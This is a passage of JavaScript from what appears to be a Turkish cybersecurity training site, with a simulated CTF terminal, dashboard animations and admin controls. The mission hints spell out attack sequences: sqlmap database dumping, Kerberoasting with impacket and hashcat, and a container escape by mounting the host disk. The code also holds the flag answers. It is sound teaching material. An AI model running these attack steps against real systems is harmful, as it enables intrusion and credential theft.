                return;
            }
            if (lower.includes('cat') && lower.includes('/root/flag.txt')) {
                printCtfOutput(`
<pre style="color: #22c55e; font-weight: 800;">
=====================================================
ROOT YETKİSİ ALINDI // FORTRESS OWNED
FLAG: LFL{level3_1_suid_privesc_root_fatihi}
=====================================================
</pre>
${renderAutoClaimFlagBtn('LFL{level3_1_suid_privesc_root_fatihi}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 3.2: Operasyon Büyük Sızıntı (SQLi)
        // ==========================================
        if (m.id === 'm3_2') {
            if (lower.includes('curl') && lower.includes('10.10.3.99')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
HTTP/1.1 200 OK
{"endpoint": "/api/search", "vulnerable_param": "q", "message": "Unsafe SQL query concatenation detected."}
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: SQLi doğrulandı! sqlmap --dbs ile veritabanlarını çekin.</span>
</pre>`);
                return;
            }
            if (lower.includes('sqlmap') && lower.includes('--dbs')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
available databases [2]:
[*] information_schema
<span style="color: #f59e0b; font-weight: 800;">[*] lfl_master_vault</span>
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: lfl_master_vault bulundu! --tables ile tabloları listele.</span>
</pre>`);
                return;
            }
            if (lower.includes('sqlmap') && lower.includes('--tables')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Database: lfl_master_vault
+---------------------------------------+
| <span style="color: #f59e0b; font-weight: 800;">master_classified_flags</span>               |
+---------------------------------------+
<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: Tablo bulundu! --dump ile içeriği dökün.</span>
</pre>`);
                return;
            }
            if (lower.includes('sqlmap') && lower.includes('--dump')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Database: lfl_master_vault // Table: master_classified_flags
+----+------------------+------------------------------------------------+
| id | security_level   | grand_master_flag                              |
+----+------------------+------------------------------------------------+
| 1  | DEFCON_1_MAXIMUM | <span style="color: #c084fc; font-weight: 800;">LFL{level3_2_sqli_grand_master_champion_2026}</span> |
+----+------------------+------------------------------------------------+
</pre>
${renderAutoClaimFlagBtn('LFL{level3_2_sqli_grand_master_champion_2026}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 4.1: Operasyon Altın Bilet (AD Kerberoasting)
        // ==========================================
        if (m.id === 'm4_1') {
            if (lower.includes('nmap') && lower.includes('10.10.4.10')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Starting Nmap 7.94SVN at 2026-11-10 01:10 UTC
Nmap scan report for dc01.lfl.corp (10.10.4.10)
PORT    STATE SERVICE      VERSION
<span style="color: #38bdf8; font-weight: 700;">88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-11-10)</span>
<span style="color: #22c55e; font-weight: 700;">389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: lfl.corp)</span>
<span style="color: #f59e0b; font-weight: 700;">445/tcp open  microsoft-ds Windows Server 2022 Standard 20348</span>
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Domain Controller (lfl.corp) aktif! enum4linux -a 10.10.4.10 ile hesapları tarayın.</span>
</pre>`);
                return;
            }
            if (lower.includes('enum4linux') && lower.includes('10.10.4.10')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
 ==========================
|    Users on 10.10.4.10   |
 ==========================
index: 0x1010 RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: Domain Admin
index: 0x1011 RID: 0x1f5 acb: 0x00000215 Account: guest          Name: Guest Account
<span style="color: #f59e0b; font-weight: 800;">index: 0x1042 RID: 0x451 acb: 0x00020210 Account: svc_mssql      Name: SQL Server Engine (SPN: MSSQLSvc/dc01.lfl.corp:1433)</span>
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: SPN tanımlı svc_mssql hesabı bulundu! impacket-GetUserSPNs ile TGS biletini çekin.</span>
</pre>`);
                return;
            }
            if (lower.includes('getuserspns') || (lower.includes('impacket') && lower.includes('10.10.4.10'))) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Impacket v0.11.0 - Copyright 2023 Fortra
ServicePrincipalName          Name       MemberOf                                   PasswordLastSet
----------------------------  ---------  -----------------------------------------  ---------------
MSSQLSvc/dc01.lfl.corp:1433   svc_mssql  CN=Domain Admins,CN=Users,DC=lfl,DC=corp   2026-09-14

<span style="color: #f59e0b; font-weight: 700;">$krb5tgs$23$*svc_mssql$LFL.CORP$MSSQLSvc/dc01.lfl.corp*$8f39a1b20e94c817d4509b3e11209f4c887a6b55...</span>
[+] TGS bilet özeti 'krb5tgs.hash' dosyasına kaydedildi.
<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: Şimdi hashcat -m 13100 krb5tgs.hash rockyou.txt ile parolayı kırın!</span>
</pre>`);
                return;
            }
            if (lower.includes('hashcat') && lower.includes('13100')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
hashcat (v6.2.6) starting in Kerberos 5, etype 23, TGS-REP (-m 13100) mode
Session..........: hashcat
Status...........: <span style="color: #22c55e; font-weight: 800;">Cracked</span>
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
<span style="color: #22c55e; font-weight: 800;">$krb5tgs$23$*svc_mssql$LFL.CORP...:LFL{level4_1_kerberoast_golden_ticket_ad}</span>
</pre>
${renderAutoClaimFlagBtn('LFL{level4_1_kerberoast_golden_ticket_ad}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 4.2: Operasyon Hayalet Sinyal (SOC Zeek C2 Hunt)
        // ==========================================
        if (m.id === 'm4_2') {
            if (lower.includes('zeek-cut') && lower.includes('conn.log')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
10.10.4.25   10.10.4.10       0.004s   [SMB Normal]
<span style="color: #ef4444; font-weight: 800;">10.10.4.25   185.220.101.44   0.042s   [BEACON INTERVAL: 60.00s | 142 Periodic Connections]</span>
10.10.4.25   8.8.8.8          0.012s   [DNS Query]
<span style="color: #ef4444; font-weight: 800;">10.10.4.25   185.220.101.44   0.041s   [BEACON INTERVAL: 60.00s | Jitter: 0.2%]</span>
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: 185.220.101.44 adresine C2 Beaconing tespit edildi! Suricata fast.log dosyasını inceleyin.</span>
</pre>`);
                return;
            }
            if (lower.includes('suricata') && lower.includes('fast.log')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
11/10/2026-01:14:00.201942  [**] [1:2026991:1] <span style="color: #f59e0b; font-weight: 800;">ET MALWARE CobaltStrike C2 DNS TXT Tunneling</span> [**] [Classification: Command and Control Traffic] [Priority: 1] {UDP} 10.10.4.25:54112 -&gt; 185.220.101.44:53
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Saldırgan DNS TXT kayıtlarıyla veri kaçırıyor! grep -i "185.220.101.44" /var/log/zeek/dns.log çalıştırın.</span>
</pre>`);
                return;
            }
            if (lower.includes('185.220.101.44') && lower.includes('dns.log')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
1794180201.441092  C9a8b12  10.10.4.25  54112  185.220.101.44  53  UDP  TXT  stage2.c2.evil.net
<span style="color: #22c55e; font-weight: 800;">1794180261.441804  C7f2e01  10.10.4.25  54189  185.220.101.44  53  UDP  TXT  c2_beacon_flag="LFL{level4_2_soc_zeek_c2_beacon_avcisi}"</span>
</pre>
${renderAutoClaimFlagBtn('LFL{level4_2_soc_zeek_c2_beacon_avcisi}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 5.1: Operasyon Kırık Kafes (Docker Container Escape)
        // ==========================================
        if (m.id === 'm5_1') {
            if (lower.includes('capsh') && lower.includes('--print')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Current: = cap_chown,cap_dac_override,cap_net_raw,<span style="color: #ef4444; font-weight: 800;">cap_sys_admin</span>+eip
Bounding set = cap_chown,cap_dac_override,cap_fowner,cap_sys_module,cap_sys_rawio,cap_sys_admin
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Konteynerde CAP_SYS_ADMIN yetkisi açık! fdisk -l ile ana sunucu diskini bulun.</span>
</pre>`);
                return;
            }
            if (lower.includes('fdisk') && lower.includes('-l')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
Device     Boot Start      End  Sectors Size Id Type
<span style="color: #f59e0b; font-weight: 800;">/dev/sda1  *     2048 83886046 83883999  40G 83 Linux (Host Root Filesystem)</span>
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Ana sunucu diski /dev/sda1 bulundu! mount /dev/sda1 /mnt/host_root ile bağlayın.</span>
</pre>`);
                return;
            }
            if (lower.includes('mount') && lower.includes('/dev/sda1')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
[+] Mounting /dev/sda1 -&gt; /mnt/host_root ... <span style="color: #22c55e; font-weight: 800;">SUCCESS (rw,relatime)</span>
<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: Konteyner izolasyonu kırıldı! cat /mnt/host_root/root/purple_flag.txt ile bayrağı okuyun.</span>
</pre>`);
                return;
            }
            if (lower.includes('purple_flag.txt')) {
                printCtfOutput(`
<pre style="color: #22c55e; font-weight: 800;">
=====================================================
PURPLE TEAM // CONTAINER ESCAPE VERIFIED
HOST NODE : k8s-prod-worker-01.lfl.internal
FLAG      : LFL{level5_1_docker_escape_host_pwned}
=====================================================
</pre>
${renderAutoClaimFlagBtn('LFL{level5_1_docker_escape_host_pwned}')}`);
                return;
            }
        }

        // ==========================================
        // MISSION 5.2: Operasyon Çekirdek Kıyameti (Grand Final Boss)
        // ==========================================
        if (m.id === 'm5_2') {
            if (lower.includes('lsmod') || (lower.includes('dmesg') && lower.includes('shadow'))) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
Module                  Size  Used by
<span style="color: #ef4444; font-weight: 800;">lfl_shadow_rk          45056  0  [RING-0 LKM ROOTKIT // SYSCALL TABLE HOOKED]</span>
nf_tables             262144  12
[  412.88102] lfl_shadow_rk: sys_getdents64 hooked at 0xffffffffc0412000
<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Gizli çekirdek modülü tespit edildi! nm /lib/modules/kernel/lfl_shadow_rk.ko ile sembolleri inceleyin.</span>
</pre>`);
                return;
            }
            if (lower.includes('lfl_shadow_rk.ko')) {
                printCtfOutput(`
<pre style="color: #94a3b8;">
0000000000000000 t init_shadow_hook
0000000000001040 T <span style="color: #f59e0b; font-weight: 800;">decrypt_vault_master_key</span>
00000000000040a0 D xor_cipher_hex_buf (KEY: 0x5A)
<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: decrypt_vault_master_key sembolü bulundu! Python exploit ile çekirdek kasasını çözün:</span>
<span style="color: #00e5ff;">python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"</span>
</pre>`);
                return;
            }
            if (lower.includes('python3') || lower.includes('decrypt')) {
                printCtfOutput(`
<pre style="color: #eab308; font-weight: 800;">
===================================================================
👑 LFL DEFCON-1 RING-0 KERNEL VAULT DECRYPTED (FINAL BOSS) 👑
===================================================================
[+] Syscall table unhooked : sys_getdents64 restored to 0xffffffff812041a0
[+] Rootkit neutralized    : lfl_shadow_rk.ko unloaded
[+] GRAND CHAMPION FLAG    : <span style="color: #22c55e; font-size: 14px;">LFL{level5_2_kernel_zeroday_omniscient_god_2026}</span>
===================================================================
</pre>
${renderAutoClaimFlagBtn('LFL{level5_2_kernel_zeroday_omniscient_god_2026}')}`);
                return;
            }
        }

        // Generic fallback for all 143+ Kali Linux commands in our catalog
        if (typeof generateTerminalResponse === 'function') {
            const fullOutput = generateTerminalResponse(cmd);
            printCtfOutput(`<div class="ctf-general-output" style="margin-top: 4px;">${fullOutput}</div>`);
            return;
        }

        // Strict unrecognized command response
        printCtfOutput(`
<pre style="color: #ef4444;">
bash: ${escapeHtml(cmd)}: komut simülasyon labında bulunamadı.
Kullanılabilir 143+ aracı görmek için 'help' yazın veya sol paneldeki görev adımlarından ⚡ Çalıştır'a tıklayın.
</pre>
        `);
    }

    // VISITOR CLIENT TELEMETRY TRACKER
    // ==========================================
    async function pingVisitorTelemetry(pathOverride) {
        try {
            const path = pathOverride ? `/${pathOverride.replace('page-', '')}` : (window.location.pathname || '/dashboard');
            const payload = {
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || 'tr',
                platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || 'Desktop',
                path: path
            };
            await api.sendVisitTelemetry(payload);
        } catch {
            // Non-blocking
        }
    }

    // ==========================================
    // CANLI TEHDİT RADARI (CANVAS 2D)
    // ==========================================
    function initRadarAnimation() {
        const canvas = document.getElementById('lfl-radar-canvas') || document.getElementById('aegis-radar-canvas');
        if (!canvas) return;

        const ctx = canvas.getContext('2d');
        const width = canvas.width || 260;
        const height = canvas.height || 260;
        const centerX = width / 2;
        const centerY = height / 2;
        const maxRadius = (width / 2) - 10;

        let sweepAngle = 0;
        const sweepSpeed = 0.038;

        const targets = [
            { r: 45, angle: 0.8, label: 'CVE-2026-X', intensity: 0 },
            { r: 75, angle: 2.2, label: 'SQLi-SCAN', intensity: 0 },
            { r: 95, angle: 4.1, label: 'X-FRAME', intensity: 0 },
            { r: 105, angle: 5.6, label: 'SYN-FLOOD', intensity: 0 }
        ];

        const pings = [];

        canvas.addEventListener('click', (e) => {
            const rect = canvas.getBoundingClientRect();
            const clickX = (e.clientX - rect.left) * (width / rect.width);
            const clickY = (e.clientY - rect.top) * (height / rect.height);
            const dx = clickX - centerX;
            const dy = clickY - centerY;
            const dist = Math.sqrt(dx * dx + dy * dy);

            if (dist <= maxRadius) {
                pings.push({
                    x: clickX,
                    y: clickY,
                    radius: 2,
                    maxRadius: 36,
                    alpha: 1.0
                });
                showToast('success', 'Savunma Önlemi Fırlatıldı', `Vektör (${Math.round(dx)}, ${Math.round(dy)}) üzerine kalkan pinglemesi gönderildi.`);
            }
        });

        const angleEl = document.getElementById('radar-sweep-angle');

        function drawRadar() {
            ctx.clearRect(0, 0, width, height);

            // Circles
            ctx.strokeStyle = 'rgba(0, 229, 255, 0.18)';
            ctx.lineWidth = 1;
            [maxRadius * 0.28, maxRadius * 0.55, maxRadius * 0.82, maxRadius].forEach(r => {
                ctx.beginPath();
                ctx.arc(centerX, centerY, r, 0, Math.PI * 2);
                ctx.stroke();
            });

            // Crosshair
            ctx.strokeStyle = 'rgba(0, 229, 255, 0.12)';
            ctx.beginPath();
            ctx.moveTo(centerX, centerY - maxRadius);
            ctx.lineTo(centerX, centerY + maxRadius);
            ctx.moveTo(centerX - maxRadius, centerY);
            ctx.lineTo(centerX + maxRadius, centerY);
            ctx.stroke();

            // Sweeping Sector
            const coneAngle = 0.55;
            const startAngle = sweepAngle - coneAngle;
            const grad = ctx.createRadialGradient(centerX, centerY, 5, centerX, centerY, maxRadius);
            grad.addColorStop(0, 'rgba(0, 229, 255, 0.35)');
            grad.addColorStop(1, 'rgba(0, 229, 255, 0.02)');

            ctx.save();
            ctx.beginPath();
            ctx.moveTo(centerX, centerY);
            ctx.arc(centerX, centerY, maxRadius, startAngle, sweepAngle, false);
            ctx.closePath();
            ctx.fillStyle = grad;
            ctx.fill();
            ctx.restore();

            // Sweep Line
            ctx.strokeStyle = '#00e5ff';
            ctx.lineWidth = 2;
            ctx.beginPath();
            ctx.moveTo(centerX, centerY);
            ctx.lineTo(
                centerX + Math.cos(sweepAngle) * maxRadius,
                centerY + Math.sin(sweepAngle) * maxRadius
            );
            ctx.stroke();

            // Targets
            targets.forEach(t => {
                const tx = centerX + Math.cos(t.angle) * t.r;
                const ty = centerY + Math.sin(t.angle) * t.r;

                let diff = (sweepAngle % (Math.PI * 2)) - t.angle;
                while (diff < 0) diff += Math.PI * 2;
                if (diff < 0.25) {
                    t.intensity = 1.0;
                } else {
                    t.intensity = Math.max(0, t.intensity - 0.012);
                }

                if (t.intensity > 0.05) {
                    ctx.save();
                    ctx.fillStyle = `rgba(239, 68, 68, ${t.intensity})`;
                    ctx.shadowColor = '#ef4444';
                    ctx.shadowBlur = 10 * t.intensity;
                    ctx.beginPath();
                    ctx.arc(tx, ty, 3 + t.intensity * 2, 0, Math.PI * 2);
                    ctx.fill();

                    ctx.fillStyle = `rgba(255, 255, 255, ${t.intensity * 0.8})`;
                    ctx.font = '9px monospace';
                    ctx.fillText(t.label, tx + 6, ty - 4);
                    ctx.restore();
                }
            });

            // Pings
            for (let i = pings.length - 1; i >= 0; i--) {
                const p = pings[i];
                ctx.save();
                ctx.strokeStyle = `rgba(34, 197, 94, ${p.alpha})`;
                ctx.lineWidth = 2;
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                ctx.stroke();
                ctx.restore();

                p.radius += 1.2;
                p.alpha -= 0.035;
                if (p.alpha <= 0) {
                    pings.splice(i, 1);
                }
            }

            sweepAngle += sweepSpeed;
            if (sweepAngle > Math.PI * 2) sweepAngle -= Math.PI * 2;

            if (angleEl) {
                const deg = Math.round((sweepAngle / (Math.PI * 2)) * 360);
                angleEl.textContent = `${String(deg).padStart(3, '0')}°`;
            }

            requestAnimationFrame(drawRadar);
        }

        drawRadar();
    }

    // ==========================================
    // CANLI TEHDİT AKIŞI
    // ==========================================
    function startAttackStream() {
        const streamContainer = document.getElementById('dashboard-attack-stream');
        if (!streamContainer) return;

        const events = [
            { ip: '185.220.101.4', type: 'SQLi Prob', act: 'LINQ Parametrik Sorgusu ile Engellendi', target: '/api/blog?tag=' },
            { ip: '45.154.255.89', type: 'Clickjacking', act: 'X-Frame-Options: DENY ile Reddedildi', target: '/index.html' },
            { ip: '194.26.29.112', type: 'MIME Sniff', act: 'nosniff başlığı ile düşürüldü', target: '/app.js' },
            { ip: '91.240.118.17', type: 'Banner Grabbing', act: 'Kestrel Server başlığı gizlendi', target: 'HTTP /' },
            { ip: '103.145.13.2', type: 'XSS Reflection', act: 'CSP Script-Whitelist ile bloke edildi', target: '/login' },
            { ip: '178.62.204.99', type: 'SSL Strip', act: 'HSTS Preload ile engellendi', target: 'Port 80' }
        ];

        let index = 0;
        function pushEvent() {
            const ev = events[index % events.length];
            index++;

            const item = document.createElement('div');
            item.className = 'attack-row';
            item.innerHTML = `
                <div class="attack-meta">
                    <span class="badge-soft-red" style="font-size: 11px; font-weight: 700; padding: 2px 8px;">${escapeHtml(ev.type)}</span>
                    <span class="attack-ip">${escapeHtml(ev.ip)}</span>
                    <span style="color: var(--text-muted); font-size: 11px; font-family: var(--font-mono);">${escapeHtml(ev.target)}</span>
                </div>
                <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
                    <span class="attack-verdict">${escapeHtml(ev.act)}</span>
                    <span style="color: var(--text-muted); font-size: 11px; font-family: var(--font-mono);">${new Date().toLocaleTimeString()}</span>
                </div>
            `;

            streamContainer.prepend(item);
            while (streamContainer.children.length > 5) {
                streamContainer.removeChild(streamContainer.lastChild);
            }
        }

        pushEvent();
        pushEvent();
        pushEvent();
        setInterval(pushEvent, 4000);
    }

    // ==========================================
    // SAAT
    // ==========================================
    function startClock() {
        const clock = document.getElementById('live-system-time');
        if (!clock) return;
        const update = () => {
            const now = new Date();
            clock.textContent = `${now.toISOString().substring(11, 19)} UTC`;
        };
        update();
        setInterval(update, 1000);
    }

    // ==========================================
    // SCROLL REVEAL ENGINE (FAIL-SAFE)
    // ==========================================
    function initScrollReveal() {
        const reveals = document.querySelectorAll('[data-reveal], [data-reveal-stagger]');
        if (!reveals.length) return;

        document.documentElement.classList.add('js-reveal-ready');

        // Immediately reveal all elements in initial viewport
        reveals.forEach(el => {
            el.classList.add('is-visible');
        });

        if ('IntersectionObserver' in window) {
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        entry.target.classList.add('is-visible');
                    }
                });
            }, { rootMargin: '0px 0px -20px 0px', threshold: 0.05 });

            reveals.forEach(el => observer.observe(el));
        }
    }

    // ==========================================
    // INITIALIZATION
    // ==========================================

    // ==========================================
    // EXCLUSIVE ADMIN SUPERPOWERS FOR burak_wyxz
    // ==========================================
    function initAdminSuperpowers() {
        // 1. DEFCON Platform Defense Level Controller
        const savedDefcon = localStorage.getItem('lfl_defcon') || '5';
        setDefconLevel(savedDefcon, false);

        ['1', '3', '5'].forEach(lvl => {
            const btn = document.getElementById(`btn-defcon-${lvl}`);
            if (btn) {
                btn.addEventListener('click', () => {
                    setDefconLevel(lvl, true);
                });
            }
        });

        // 2. Clear / Purge Access Logs
        const btnClearLogs = document.getElementById('btn-clear-logs');
        if (btnClearLogs) {
            btnClearLogs.addEventListener('click', () => {
                if (confirm('Tüm ziyaretçi ve telemetri log kayıtlarını silmek istediğinize emin misiniz?')) {
                    localStorage.removeItem('lfl_access_logs');
                    state.accessLogs = [];
                    renderAccessLogs('');
                    const totalEl = document.getElementById('log-stat-total');
                    if (totalEl) totalEl.textContent = '0';
                    const ipsEl = document.getElementById('log-stat-ips');
                    if (ipsEl) ipsEl.textContent = '0';
                    showToast('info', 'Loglar Temizlendi', 'Ziyaretçi telemetri veritabanı başarıyla sıfırlandı.');
                }
            });
        }

        // 3. Admin Broadcast Announcement
        const savedBroadcast = localStorage.getItem('lfl_broadcast_msg');
        if (savedBroadcast) {
            showBroadcastBanner(savedBroadcast);
        }

        const btnPublish = document.getElementById('btn-publish-broadcast');
        const inputBroadcast = document.getElementById('admin-broadcast-input');
        if (btnPublish && inputBroadcast) {
            btnPublish.addEventListener('click', () => {
                const msg = inputBroadcast.value.trim();
                if (!msg) {
                    showToast('error', 'Hata', 'Lütfen yayınlamak için bir duyuru mesajı yazın.');
                    return;
                }
                localStorage.setItem('lfl_broadcast_msg', msg);
                showBroadcastBanner(msg);
                showToast('success', 'Duyuru Yayınlandı', 'Neon acil durum bandı tüm platformda yayına girdi.');
            });
        }

        const btnClearBroadcast = document.getElementById('btn-clear-broadcast');
        const btnDismissBroadcast = document.getElementById('btn-dismiss-broadcast');
        const handleDismiss = () => {
            localStorage.removeItem('lfl_broadcast_msg');
            const bar = document.getElementById('admin-global-broadcast-bar');
            if (bar) bar.classList.add('hidden');
            showToast('info', 'Duyuru Kaldırıldı', 'Duyuru bandı kaldırıldı.');
        };
        if (btnClearBroadcast) btnClearBroadcast.addEventListener('click', handleDismiss);
        if (btnDismissBroadcast) btnDismissBroadcast.addEventListener('click', handleDismiss);

        // 4. CTF Master Root Key (Unlock all 10 levels & 6000 XP instantly)
        const btnBypassCtf = document.getElementById('btn-admin-bypass-ctf');
        if (btnBypassCtf) {
            btnBypassCtf.addEventListener('click', () => {
                const totalXp = CTF_MISSIONS.reduce((acc, m) => acc + m.xp, 0);
                if (confirm(`👑 MASTER ROOT KEY:\n\nTüm ${CTF_MISSIONS.length} CTF sızma seviyesini ve ${totalXp} XP puanını yönetici yetkisiyle anında tamamlamak istiyor musunuz?`)) {
                    ctfState.completed = CTF_MISSIONS.map(m => m.id);
                    CTF_MISSIONS.forEach(m => {
                        ctfState.completedSteps[m.id] = (m.steps || []).map((_, i) => i);
                    });
                    ctfState.unlockedIdx = CTF_MISSIONS.length - 1;
                    ctfState.xp = totalXp;
                    saveCtfProgressToStorage();
                    renderCtfProgress();
                    renderCtfStageTabs();
                    renderCtfBriefing(ctfState.activeIdx);
                    showToast('success', '👑 Master Key Aktif', `Tüm ${CTF_MISSIONS.length} operasyon ve ${totalXp} XP yönetici olarak açıldı!`);
                    printCtfOutput(`\n<span style="color: #f59e0b; font-weight: 800;">[ROOT MASTER BYPASS]</span> <span style="color: #10b981;">Tüm 10 sızma seviyesi Platform Mimarı burak_wyxz tarafından %100 açıldı! (+${totalXp} XP)</span>\n`);
                }
            });
        }
    }

    function setDefconLevel(level, notify = false) {
        localStorage.setItem('lfl_defcon', level);
        ['1', '3', '5'].forEach(lvl => {
            const b = document.getElementById(`btn-defcon-${lvl}`);
            if (b) b.classList.toggle('active', lvl === level);
        });

        const beacon = document.querySelector('.cluster-status-row .pulsing-beacon');
        const label = document.querySelector('.cluster-status-row .cluster-label');

        if (level === '1') {
            if (beacon) { beacon.style.background = '#ef4444'; beacon.style.boxShadow = '0 0 16px #ef4444'; }
            if (label) { label.style.color = '#ef4444'; label.textContent = 'DEFCON 1 // KIRMIZI ALARM'; }
            if (notify) showToast('error', 'DEFCON 1 Aktif', 'Platform KIRMIZI ALARM moduna geçirildi! Ağ savunması maksimum seviyede.');
        } else if (level === '3') {
            if (beacon) { beacon.style.background = '#f59e0b'; beacon.style.boxShadow = '0 0 14px #f59e0b'; }
            if (label) { label.style.color = '#f59e0b'; label.textContent = 'DEFCON 3 // YÜKSEK GÜVENLİK'; }
            if (notify) showToast('warning', 'DEFCON 3 Aktif', 'Platform SARI UYARI moduna geçirildi.');
        } else {
            if (beacon) { beacon.style.background = 'var(--green)'; beacon.style.boxShadow = '0 0 10px var(--green)'; }
            if (label) { label.style.color = 'var(--green)'; label.textContent = 'NODE CLUSTER // AKTİF'; }
            if (notify) showToast('success', 'DEFCON 5 Aktif', 'Platform standart güvenli savunma moduna döndü.');
        }
    }

    function showBroadcastBanner(text) {
        const bar = document.getElementById('admin-global-broadcast-bar');
        const txt = document.getElementById('admin-broadcast-text');
        if (bar && txt) {
            txt.innerHTML = `🚨 <strong>DUYURU:</strong> ${escapeHtml(text)} &bull; <span style="color: #a7f3d0; font-family: var(--font-mono);">[YÖNETİCİ: burak_wyxz]</span>`;
            bar.classList.remove('hidden');
        }
    }

    async function init() {
        // 1. Boot Dragon Intro Splash immediately
        try { initIntroSplash(); } catch (e) { console.error('[IntroSplash Error]', e); }

        // 2. Core navigation & UI controls (Never let secondary modules block navigation)
        try { startClock(); } catch (e) { }
        try { bindDropdowns(); } catch (e) { }
        try { bindNavigation(); } catch (e) { console.error('[bindNavigation Error]', e); }
        try { initKaliTerminal(); } catch (e) { console.error('[initKaliTerminal Error]', e); }

        // 3. Educational & interactive sub-modules
        try { bindAcademyCurriculum(); } catch (e) { }
        try { bindAcademyCheatsheet(); } catch (e) { }
        try { bindCyberRoleQuiz(); } catch (e) { }
        try { bindGlossary(); } catch (e) { }
        try { initCtfArena(); } catch (e) { }
        try { renderGlossary('all', ''); } catch (e) { }

        // 4. Admin, simulator, auth & telemetry
        try { initAdminSuperpowers(); } catch (e) { }
        try { bindSimulator(); } catch (e) { }
        try { bindAuthModal(); } catch (e) { }
        try { bindChangelogModal(); } catch (e) { console.error("[Changelog Error]", e); }
        try { bindAccessLogsPanel(); } catch (e) { }

        // 5. Theme & fail-safe content reveal
        try { setTheme(state.theme); } catch (e) { }
        try { initScrollReveal(); } catch (e) { }
        try { pingVisitorTelemetry('/dashboard'); } catch (e) { }
        try { await restoreSession(); } catch (e) { }
        try { startAttackStream(); } catch (e) { }
        try { renderSessionStorageInspector(); } catch (e) { }
        try { if (window.I18N) window.I18N.setLanguage(I18N.currentLang); } catch (e) { console.error('[i18n Error]', e); }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();

/* ==========================================================================
   LFL (LOST FROM LIGHT) ANIMATION ENGINE V3.0 — Visual Parallax & Particles
   ========================================================================== */
function initAnimationEngine() {
    const progressBar = document.getElementById('scroll-progress-bar');
    const mainArea = document.querySelector('.app-main');

    if (progressBar && mainArea) {
        mainArea.addEventListener('scroll', () => {
            const { scrollTop, scrollHeight, clientHeight } = mainArea;
            const pct = scrollHeight > clientHeight
                ? Math.round((scrollTop / (scrollHeight - clientHeight)) * 100)
                : 0;
            progressBar.style.width = pct + '%';

            const topbar = document.querySelector('.app-topbar');
            if (topbar) topbar.classList.toggle('topbar-elevated', scrollTop > 10);
        }, { passive: true });
    }

    // Particle Canvas Background
    const canvas = document.getElementById('lfl-particle-canvas') || document.getElementById('aegis-particle-canvas');
    if (canvas) {
        const ctx = canvas.getContext('2d');
        let width = canvas.width = window.innerWidth;
        let height = canvas.height = window.innerHeight;

        window.addEventListener('resize', () => {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
        });

        const particles = Array.from({ length: 45 }, () => ({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 0.4,
            vy: (Math.random() - 0.5) * 0.4,
            radius: Math.random() * 1.5 + 0.5,
            alpha: Math.random() * 0.5 + 0.2
        }));

        function drawParticles() {
            ctx.clearRect(0, 0, width, height);
            ctx.fillStyle = 'rgba(0, 229, 255, 0.4)';

            particles.forEach(p => {
                p.x += p.vx;
                p.y += p.vy;
                if (p.x < 0) p.x = width;
                if (p.x > width) p.x = 0;
                if (p.y < 0) p.y = height;
                if (p.y > height) p.y = 0;

                ctx.beginPath();
                ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                ctx.fill();
            });

            requestAnimationFrame(drawParticles);
        }

        drawParticles();
    }
}


